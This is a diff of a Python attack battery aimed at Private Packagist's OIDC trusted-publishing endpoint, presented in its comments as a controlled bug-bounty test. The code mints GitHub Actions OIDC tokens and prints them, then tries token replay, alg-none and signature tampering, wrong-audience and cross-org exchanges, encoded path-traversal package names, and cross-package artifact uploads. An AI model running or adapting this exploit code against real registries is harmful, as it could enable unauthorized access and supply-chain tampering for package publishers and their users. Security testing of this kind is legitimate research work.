@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
-# zt-battery.py - in-runner validation battery for Private Packagist Trusted Publishing (OIDC).
+# zt-battery.py v2 - in-runner validation battery for Private Packagist Trusted Publishing (OIDC).
 # Controlled bug-bounty test: throwaway org pratik-sec-test, throwaway repo pkbbtmpb748/zt-tp-repo.
 # Modes via env MODE: token | exchange | battery
 # Env: AUDIENCE_IN (override), TARGET_ORG, TARGET_PKG
-# Minting uses ACTIONS_ID_TOKEN_REQUEST_URL / ACTIONS_ID_TOKEN_REQUEST_TOKEN provided by GitHub Actions.
-import base64, hashlib, hmac, json, os, secrets, sys, time, urllib.error, urllib.request
-from urllib.parse import quote, parse_qsl, urlencode
+import base64, hashlib, hmac, io, json, os, secrets, sys, time, urllib.error, urllib.request, zipfile
+from urllib.parse import parse_qsl, urlencode
 
 API = "https://packagist.com"
 HOST = "packagist.com"
@@ -17,7 +16,7 @@ def env(name, default=""):
 MODE = env("MODE", "exchange")
 AUDIENCE = env("AUDIENCE_IN") or "private-packagist-trusted-publishing:pratik-sec-test"
 TARGET_ORG = env("TARGET_ORG", "pratik-sec-test")
-TARGET_PKG = env("TARGET_PKG", "zt-tp-test")
+TARGET_PKG = env("TARGET_PKG", "zt-tp/zt-tp-test")
 REQ_URL = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
 REQ_TOK = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
 
@@ -25,7 +24,7 @@ def out(*a):
     print(*a, flush=True)
 
 def mint(aud):
-    req = urllib.request.Request(REQ_URL + "&audience=" + quote(aud, safe=""),
+    req = urllib.request.Request(REQ_URL + "&audience=" + urllib.request.quote(aud, safe=""),
                                  headers={"Authorization": "Bearer " + REQ_TOK})
     with urllib.request.urlopen(req, timeout=60) as r:
         return json.loads(r.read())["value"]
@@ -42,48 +41,57 @@ def raw(method, path, headers=None, body=None):
     except Exception as e:
         return -1, {}, repr(e)
 
-def rep(label, res, n=1500):
+def reps(label, res, n=1200):
     st, hd, body = res
     out(f"### {label} => HTTP {st}")
-    hd = {k: v for k, v in (hd or {}).items()}
-    interesting = {k: v for k, v in hd.items() if k.lower() in
-                   ("content-type", "retry-after", "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset")}
-    if interesting:
-        out("HEADERS: " + json.dumps(interesting))
     out(body[:n])
     out()
     return res
 
 def exchange(bearer, org=None, pkg=None):
-    return raw("POST", f"/api/oidc/token-exchange/{org or TARGET_ORG}/{pkg if pkg is not None else TARGET_PKG}",
-               {"Authorization": "Bearer " + bearer})
+    p = pkg if pkg is not None else TARGET_PKG
+    return raw("POST", f"/api/oidc/token-exchange/{org or TARGET_ORG}/{p}", {"Authorization": "Bearer " + bearer})
 
-def norm_query(q):
-    if not q:
-        return ""
-    return urlencode(sorted(parse_qsl(q, keep_blank_values=True)), quote_via=quote)
+def penc(b):
+    if isinstance(b, str):
+        b = b.encode()
+    out_ = []
+    for byte in b:
+        if (48 <= byte <= 57) or (65 <= byte <= 90) or (97 <= byte <= 122) or byte in b"-_.~":
+            out_.append(chr(byte))
+        else:
+            out_.append("%%%02X" % byte)
+    return "".join(out_)
 
-def sign(method, path, key, secret, query="", body=""):
+def sign(method, path, key, secret, query="", body=b""):
     ts = str(int(time.time()))
     cnonce = secrets.token_hex(20)
-    params = {"key": key, "timestamp": ts, "cnonce": cnonce, "version": "2", "query": norm_query(query)}
+    params = {"key": key, "timestamp": ts, "cnonce": cnonce, "version": "2", "query": query}
     if body:
         params["body"] = body
-    canonical = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in sorted(params.items()))
+    items = sorted(params.items(), key=lambda kv: kv[0])
+    canonical = "&".join(f"{penc(k)}={penc(v)}" for k, v in items)
     sts = f"{method}\n{HOST}\n{path}\n{canonical}"
     sig = base64.b64encode(hmac.new(secret.encode(), sts.encode(), hashlib.sha256).digest()).decode()
     return f"PACKAGIST-HMAC-SHA256 Key={key}, Timestamp={ts}, Cnonce={cnonce}, Version=2, Signature={sig}"
 
-def signed(method, path, key, secret, query="", body=""):
+def signed(method, path, key, secret, query="", body=b"", label=""):
     h = {"Authorization": sign(method, path, key, secret, query=query, body=body)}
     if body:
         h["Content-Type"] = "application/json"
-    return raw(method, path + (("?" + query) if query else ""), h, body or None)
+    return reps(label, raw(method, path + (("?" + query) if query else ""), h, body or None))
 
-def upload(path, key, secret, content, filename, ctype="text/plain"):
+def make_zip(name, version):
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("composer.json", json.dumps({"name": name, "version": version,
+                  "description": "zt trusted-publishing test artifact", "type": "library"}))
+    return buf.getvalue()
+
+def upload(path, key, secret, content, filename, label):
     h = {"Authorization": sign("POST", path, key, secret, body=content),
-         "Content-Type": ctype, "X-FILENAME": filename}
-    return raw("POST", path, h, content)
+         "Content-Type": "application/zip", "X-FILENAME": filename}
+    return reps(label, raw("POST", path, h, content))
 
 def main():
     out(f"CONFIG mode={MODE} aud={AUDIENCE} target={TARGET_ORG}/{TARGET_PKG}")
@@ -95,14 +103,13 @@ def main():
     if MODE == "exchange":
         t = mint(AUDIENCE)
         out("TOKEN_B64=" + base64.b64encode(t.encode()).decode())
-        rep("EXCHANGE", exchange(t))
+        reps("EXCHANGE", exchange(t))
         return
 
-    # ---------------- battery ----------------
-    # 1) legit exchange with token A
+    # ---------------- battery v2 ----------------
     A = mint(AUDIENCE)
     out("TOKEN_A_B64=" + base64.b64encode(A.encode()).decode())
-    r = rep("T1-LEGIT exchange token-A", exchange(A))
+    r = reps("T1-LEGIT exchange token-A -> " + TARGET_PKG, exchange(A))
     key = secret = None
     if r[0] == 200:
         try:
@@ -110,67 +117,58 @@ def main():
             out("T1_KEY=" + str(key)); out("T1_SECRET=" + str(secret))
         except Exception as e:
             out("T1 parse err: " + repr(e))
-    # 2) replay token A
-    rep("T2-REPLAY token-A again", exchange(A))
-    # 3) tamper battery with fresh token B
+    reps("T2-REPLAY token-A again", exchange(A))
+
     B = mint(AUDIENCE)
     H, P, S = B.split(".")
     Sx = S[:-1] + ("A" if S[-1] != "A" else "B")
     NH = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
-    rep("T3a-TAMPER sig-flip", exchange(f"{H}.{P}.{Sx}"))
-    rep("T3b-TAMPER alg-none", exchange(f"{NH}.{P}."))
+    reps("T3a-TAMPER sig-flip", exchange(f"{H}.{P}.{Sx}"))
+    reps("T3b-TAMPER alg-none", exchange(f"{NH}.{P}."))
     mid = len(P) // 2
     Pbad = P[:mid] + ("A" if P[mid] != "A" else "B") + P[mid + 1:]
-    rep("T3c-TAMPER payload-flip", exchange(f"{H}.{Pbad}.{S}"))
-    rep("T3d-TAMPER truncated", exchange(B[:80]))
-    rep("T3e-TAMPER empty-bearer", exchange(""))
-    rep("T3f-TAMPER garbage-bearer", exchange("garbage.token.here"))
-    # 4) verify token B still valid after tamper attempts
-    rep("T4-TAMPER-VERIFY token-B legit", exchange(B))
-    # 5) wrong package in same org
+    reps("T3c-TAMPER payload-flip", exchange(f"{H}.{Pbad}.{S}"))
+    reps("T3d-TAMPER truncated", exchange(B[:80]))
+    reps("T3e-TAMPER empty-bearer", exchange(""))
+    reps("T3f-TAMPER garbage-bearer", exchange("garbage.token.here"))
+    reps("T4-TAMPER-VERIFY token-B legit", exchange(B))
+
     C = mint(AUDIENCE)
-    rep("T5-WRONG-PACKAGE zt-tp-other-pkg", exchange(C, pkg="zt-tp-other-pkg"))
-    # 6) cross-org (victim-sec-test = second org, no publisher configured there)
+    reps("X1-EXISTS-NO-CONFIG psr%2Flog", exchange(C, pkg="psr%2Flog"))
     D = mint(AUDIENCE)
-    rep("T6-CROSS-ORG victim-sec-test/zt-tp-test", exchange(D, org="victim-sec-test", pkg="zt-tp-test"))
-    # 7/8) wrong audience variants
+    reps("X2-CONFIG-NO-PACKAGE zt-tp%2Fzt-tp-new", exchange(D, pkg="zt-tp%2Fzt-tp-new"))
     E = mint("private-packagist-trusted-publishing:victim-sec-test")
-    rep("T7-WRONG-AUD victim-aud -> own org", exchange(E))
+    reps("X4-WRONG-AUD victim-aud -> own package", exchange(E))
     F = mint("zt-garbage-aud")
-    rep("T8-WRONG-AUD garbage-aud -> own org", exchange(F))
-    # 9) package param variants
+    reps("X5-WRONG-AUD garbage-aud -> own package", exchange(F))
     G = mint(AUDIENCE)
-    rep("T9a-PARAM uppercase-pkg", exchange(G, pkg="ZT-TP-TEST"))
-    rep("T9b-PARAM encoded-slash", exchange(G, pkg="zt-tp-test%2F..%2Fzt-tp-other-pkg"))
-    rep("T9c-METHOD GET-exchange", raw("GET", f"/api/oidc/token-exchange/{TARGET_ORG}/{TARGET_PKG}",
-                                       {"Authorization": "Bearer " + G}))
-    rep("T9d-PATH org-only", exchange(G, pkg=""))
-    # 10) power battery with issued key/secret (v2 HMAC per client RequestSignature)
-    if key:
-        rep("P1-GET /api/packages/ signed", signed("GET", "/api/packages/", key, secret, query="origin=private"))
-        rep("P2-GET /api/teams/ signed", signed("GET", "/api/teams/", key, secret))
-        rep("P3-GET /api/tokens/ signed", signed("GET", "/api/tokens/", key, secret))
-        rep("P4-GET /api/organization/ssh-access-key signed", signed("GET", "/api/organization/ssh-access-key", key, secret))
-        rep("P5-GET /api/customers/ signed", signed("GET", "/api/customers/", key, secret))
-        rep("P6-GET /api/packages/ raw PACKAGIST-TOKEN", raw("GET", "/api/packages/", {"Authorization": "PACKAGIST-TOKEN " + key}))
-        rep("P7-UPLOAD to configured pkg (add flow)", upload(f"/api/packages/{TARGET_PKG}/artifacts/", key, secret, "zt-artifact-1", "zt-artifact.txt"))
-        rep("P8-UPLOAD to OTHER pkg (cross-pkg)", upload("/api/packages/zt-tp-other-pkg/artifacts/", key, secret, "zt-artifact-2", "zt-artifact.txt"))
-        st, hd, body = upload("/api/packages/artifacts/", key, secret, "zt-artifact-3", "zt-artifact.txt")
-        rep("P9-UPLOAD unbound (/packages/artifacts/)", (st, hd, body))
+    reps("X6-CROSS-ORG victim-sec-test/victim-sec-test%2Fzt-metabill-v1",
+         exchange(G, org="victim-sec-test", pkg="victim-sec-test%2Fzt-metabill-v1"))
+    Hh = mint(AUDIENCE)
+    reps("X7-UPPERCASE-PKG ZT-TP%2FZT-TP-TEST", exchange(Hh, pkg="ZT-TP%2FZT-TP-TEST"))
+    I = mint(AUDIENCE)
+    reps("X9-ENCODED-DOTS psr%2Flog%2E%2E%2Fzt-tp%2Fzt-tp-test",
+         exchange(I, pkg="psr%2Flog%2E%2E%2Fzt-tp%2Fzt-tp-test"))
+
+    if key and secret:
+        z1 = make_zip("zt-tp/zt-tp-test", "1.0.1")
+        z2 = make_zip("zt-tp/zt-tp-new", "1.0.0")
+        upload("/api/packages/zt-tp%2Fzt-tp-test/artifacts/", key, secret, z1, "zt-tp-test-1.0.1.zip",
+               "P1-ZIP-UPLOAD own package (custom type -> expect 400)")
+        upload("/api/packages/psr%2Flog/artifacts/", key, secret, z1, "zt-tp-test-1.0.1.zip",
+               "P2-ZIP-UPLOAD cross-package psr%2Flog (expect 404)")
+        st, hd, body = upload("/api/packages/artifacts/", key, secret, z2, "zt-tp-new-1.0.0.zip",
+                              "P3-ZIP-UPLOAD unbound")
         aid = None
         try:
-            j = json.loads(body)
-            aid = j.get("id") if isinstance(j, dict) else (j[0].get("id") if j else None)
+            j = json.loads(body); aid = j.get("id") if isinstance(j, dict) else None
         except Exception:
             pass
         if aid:
-            rep("P9b-CREATE artifact pkg from upload id", signed("POST", "/api/packages/", key, secret,
-                body=json.dumps({"repoType": "artifact", "artifactIds": [aid]})))
-        rep("P10-CREATE arbitrary pkg JSON", signed("POST", "/api/packages/", key, secret,
-            body=json.dumps({"name": "zt-tp-evil-pkg"})))
-        rep("P11-PUT configured pkg same-name", signed("PUT", f"/api/packages/{TARGET_PKG}/", key, secret,
-            body=json.dumps({"name": TARGET_PKG})))
-        rep("P12-DELETE configured pkg (LAST)", signed("DELETE", f"/api/packages/{TARGET_PKG}/", key, secret))
+            signed("POST", "/api/packages/", key, secret,
+                   body=json.dumps({"repoType": "artifact", "artifactIds": [aid]}), label="P4-CREATE artifact pkg from upload")
+        signed("GET", "/api/packages/zt-tp%2Fzt-tp-test/", key, secret, label="P5-GET own package")
+        signed("GET", "/api/packages/", key, secret, label="P6-GET package list (scope check)")
     out("BATTERY-DONE")
 
 if __name__ == "__main__":
